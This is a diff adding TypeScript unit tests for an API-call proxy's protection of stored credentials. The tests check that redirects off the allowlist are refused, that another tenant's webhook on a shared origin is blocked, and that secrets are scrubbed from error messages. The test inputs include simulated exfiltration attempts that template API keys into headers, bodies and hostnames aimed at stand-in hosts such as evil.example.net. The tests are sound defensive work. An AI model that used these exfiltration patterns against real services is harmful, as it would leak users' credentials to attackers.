@@ -1531,6 +1531,347 @@ describe("executeApiCall — debug diagnostic envelope (#404)", () => {
     expect(envelope!.injectedHeader).toBeNull();
     expect(envelope!.urlPolicy).toBe("allow_all");
   });
+
+  it("reports urlPolicy 'allowlist' when a templated credential downgrades allow_all", async () => {
+    const fetchCredentials = mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { api_key: "SECRET" },
+      authorizedUris: ["https://api.example.com/**"],
+      allowAllUris: true,
+      credentialFieldName: "api_key",
+    }));
+    const records = await captureLogs("debug", async () => {
+      const r = await executeApiCall(
+        {
+          integrationId: "gmail",
+          connectionId: "conn-1",
+          targetUrl: "https://api.example.com/messages",
+          method: "GET",
+          callerHeaders: { "X-Key": "{{api_key}}" },
+          body: { kind: "none" },
+        },
+        makeDeps({ fetchCredentials }),
+      );
+      expect(r.ok).toBe(true);
+    });
+    const envelope = records.find((r) => r.msg === "integration api_call completed");
+    expect(envelope).toBeDefined();
+    expect(envelope!.urlPolicy).toBe("allowlist");
+  });
+});
+
+describe("executeApiCall — redirects after the credential-exfiltration downgrade", () => {
+  /** allow_all_uris AND an allowlist; no server-side header injection. */
+  const allowAllWithAllowlist = () =>
+    mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { api_key: "SECRET" },
+      authorizedUris: ["https://api.example.com/**"],
+      allowAllUris: true,
+      credentialFieldName: "api_key",
+    }));
+
+  /** Allowlisted host answers `status → location`; every other host 200s. */
+  function redirectingFetch(status: number, location: string) {
+    const calls: { url: string; init: RequestInit & { headers: Record<string, string> } }[] = [];
+    const fetchFn = mock(async (url: string | URL, init?: RequestInit) => {
+      const u = typeof url === "string" ? url : url.toString();
+      calls.push({ url: u, init: init as RequestInit & { headers: Record<string, string> } });
+      if (u.startsWith("https://api.example.com")) {
+        return new Response(null, { status, headers: { location } });
+      }
+      return new Response("ok", { status: 200 });
+    });
+    return { fetchFn: fetchFn as unknown as typeof fetch, calls };
+  }
+
+  it("refuses a 302 off the allowlist when a header templates a credential", async () => {
+    const { fetchFn, calls } = redirectingFetch(302, "https://evil.example.net/c");
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/start",
+        method: "GET",
+        callerHeaders: { "X-Key": "{{api_key}}" },
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchFn, fetchCredentials: allowAllWithAllowlist() }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/Redirect blocked \(unauthorized\)/);
+      expect(result.error).toContain("evil.example.net");
+    }
+    expect(calls.map((c) => c.url)).toEqual(["https://api.example.com/start"]);
+    expect(calls[0]!.init.headers["X-Key"]).toBe("SECRET");
+  });
+
+  it("refuses a 307 off the allowlist when the substituted body carries a credential", async () => {
+    const { fetchFn, calls } = redirectingFetch(307, "https://evil.example.net/c");
+    const text = '{"key":"{{api_key}}"}';
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/start",
+        method: "POST",
+        callerHeaders: { "content-type": "application/json" },
+        body: {
+          kind: "buffered",
+          bytes: new TextEncoder().encode(text).buffer as ArrayBuffer,
+          text,
+        },
+        substituteBody: true,
+      },
+      makeDeps({ fetchFn, fetchCredentials: allowAllWithAllowlist() }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/Redirect blocked \(unauthorized\)/);
+    }
+    expect(calls.map((c) => c.url)).toEqual(["https://api.example.com/start"]);
+    expect(calls[0]!.init.body).toBe('{"key":"SECRET"}');
+  });
+
+  it("still follows allow_all redirects to a public host when no credential is templated", async () => {
+    const { fetchFn, calls } = redirectingFetch(302, "https://elsewhere.example.net/c");
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/start",
+        method: "GET",
+        callerHeaders: { "X-Custom": "x" },
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchFn, fetchCredentials: allowAllWithAllowlist() }),
+    );
+    expect(result.ok).toBe(true);
+    if (result.ok) expect(result.finalUrl).toBe("https://elsewhere.example.net/c");
+    expect(calls.map((c) => c.url)).toEqual([
+      "https://api.example.com/start",
+      "https://elsewhere.example.net/c",
+    ]);
+  });
+});
+
+describe("executeApiCall — credential exfiltration with URL-valued credential fields", () => {
+  const VICTIM_HOOK = "https://hooks.example.com/services/TVICTIM/x";
+  const fieldCreds = (policy: { authorizedUris: string[] | null; allowAllUris: boolean }) =>
+    mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { webhook_url: VICTIM_HOOK, secret_header_value: "S", api_key: "SECRET" },
+      ...policy,
+      credentialFieldName: "api_key",
+    }));
+
+  function recordingFetch() {
+    const calls: string[] = [];
+    const fetchFn = mock(async (url: string | URL) => {
+      calls.push(String(url));
+      return new Response("ok");
+    });
+    return { fetchFn: fetchFn as unknown as typeof fetch, calls };
+  }
+
+  // A field's origin is often shared by tenants (hooks.slack.com): it must
+  // never make another endpoint on it a valid destination for the secret.
+  it.each([
+    [
+      "a JSON body carrying {{webhook_url}}",
+      { callerHeaders: {}, body: { kind: "json", value: { u: "{{webhook_url}}" } } },
+    ],
+    [
+      "a header carrying a secret",
+      { callerHeaders: { "X-Secret": "{{secret_header_value}}" }, body: { kind: "none" } },
+    ],
+  ] as const)(
+    "allow_all_uris, no allowlist: refuses %s to another tenant's hook on the field's origin",
+    async (_, req) => {
+      const { fetchFn, calls } = recordingFetch();
+      const result = await executeApiCall(
+        {
+          integrationId: "demo",
+          targetUrl: "https://hooks.example.com/services/TATTACKER/y",
+          method: "POST",
+          ...req,
+          substituteBody: true,
+        } as Parameters<typeof executeApiCall>[0],
+        makeDeps({
+          fetchFn,
+          fetchCredentials: fieldCreds({ authorizedUris: null, allowAllUris: true }),
+        }),
+      );
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.status).toBe(403);
+      expect(calls).toHaveLength(0);
+    },
+  );
+
+  it("declared allowlist: refuses a templated call to a URL-valued field outside it", async () => {
+    const { fetchFn, calls } = recordingFetch();
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "{{webhook_url}}",
+        method: "POST",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({
+        fetchFn,
+        fetchCredentials: fieldCreds({
+          authorizedUris: ["https://api.example.com/**"],
+          allowAllUris: false,
+        }),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/URL not authorized/);
+      expect(result.error).not.toContain("hooks.example.com");
+    }
+    expect(calls).toHaveLength(0);
+  });
+
+  it("detects a JSON-body leaf credential with whitespace inside the braces", async () => {
+    const { fetchFn, calls } = recordingFetch();
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://evil.example/collect",
+        method: "POST",
+        callerHeaders: {},
+        body: { kind: "json", value: { k: "{{\tapi_key}}" } },
+        substituteBody: true,
+      },
+      makeDeps({
+        fetchFn,
+        fetchCredentials: fieldCreds({ authorizedUris: null, allowAllUris: true }),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.status).toBe(403);
+    expect(calls).toHaveLength(0);
+  });
+});
+
+describe("executeApiCall — no credential in an error host", () => {
+  const SECRET = "AbCSecret9";
+  const globCreds = mock(async (): Promise<CredentialsResponse> => ({
+    credentials: { api_key: SECRET },
+    authorizedUris: ["https://*.api-us1.com/**"],
+    allowAllUris: false,
+    credentialFieldName: "api_key",
+  }));
+
+  it.each([
+    ["an unresolvable host", { resolveHost: async () => Promise.reject(new Error("ENOTFOUND")) }],
+    [
+      "a transport error",
+      {
+        fetchFn: mock(async () => {
+          throw Object.assign(new Error("connect failed"), { code: "ECONNREFUSED" });
+        }) as unknown as typeof fetch,
+      },
+    ],
+  ])("redacts a host-templated secret from %s", async (_, overrides) => {
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://{{api_key}}.api-us1.com/v3/contacts",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchCredentials: globCreds, ...overrides }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(502);
+      expect(result.error).toContain("{{api_key}}.api-us1.com");
+      expect(result.error).not.toContain(SECRET);
+      expect(result.error).not.toContain(SECRET.toLowerCase());
+    }
+  });
+
+  it("does not scrub a guessed credential value on an untemplated call (no oracle)", async () => {
+    const probe = async (host: string) => {
+      const result = await executeApiCall(
+        {
+          integrationId: "wp",
+          connectionId: "conn-1",
+          targetUrl: `https://${host}.nx.invalid/`,
+          method: "GET",
+          callerHeaders: {},
+          body: { kind: "none" },
+        },
+        makeDeps({
+          resolveHost: async () => Promise.reject(new Error("ENOTFOUND")),
+          fetchCredentials: mock(async (): Promise<CredentialsResponse> => ({
+            credentials: { username: "jdoe", application_password: "xxxx yyyy" },
+            authorizedUris: [],
+            allowAllUris: true,
+            credentialHeaderName: "Authorization",
+            credentialHeaderPrefix: "Basic ",
+            credentialFieldName: "application_password",
+          })),
+        }),
+      );
+      return result.ok ? "" : result.error;
+    };
+    // A matching guess reads exactly like a non-matching one.
+    expect(await probe("alice")).toContain("(alice.nx.invalid)");
+    expect(await probe("jdoe")).toContain("(jdoe.nx.invalid)");
+  });
+
+  it("scrubs the refreshed credential from a redirect refusal after a 401 retry", async () => {
+    const FRESH = "FreshTok42";
+    const creds = (token: string) =>
+      mock(async (): Promise<CredentialsResponse> => ({
+        credentials: { access_token: token },
+        authorizedUris: ["https://api.example.com/**"],
+        allowAllUris: false,
+        credentialHeaderName: "Authorization",
+        credentialHeaderPrefix: "Bearer ",
+        credentialFieldName: "access_token",
+      }));
+    let calls = 0;
+    const fetchFn = mock(async () =>
+      ++calls === 1
+        ? new Response("expired", { status: 401 })
+        : new Response(null, {
+            status: 302,
+            headers: { location: `https://${FRESH}.evil.example/` },
+          }),
+    );
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/v1?t={{access_token}}",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({
+        fetchCredentials: creds("tok-old"),
+        refreshCredentials: creds(FRESH),
+        fetchFn: fetchFn as unknown as typeof fetch,
+      }),
+    );
+    expect(calls).toBe(2);
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toContain("host={{access_token}}.evil.example");
+      expect(result.error.toLowerCase()).not.toContain(FRESH.toLowerCase());
+    }
+  });
 });
 
 describe("executeApiCall — SSRF DNS-rebind layer", () => {
